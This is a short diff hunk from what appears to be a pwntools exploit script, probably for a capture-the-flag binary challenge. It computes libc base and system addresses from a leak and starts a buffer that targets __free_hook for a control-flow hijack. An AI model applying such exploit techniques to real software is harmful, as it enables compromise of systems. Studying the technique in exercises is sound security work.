@@ -27,8 +27,6 @@ system_addr = libc_base + libc.sym.system
 print("libc_leak =", hex(libc_leak))
 print("libc_base =", hex(libc_base))
 
-#s.interactive()
-
 # Write __free_hook in stack
 buf  = p64(free_hook)
 buf += p64(free_hook+2)
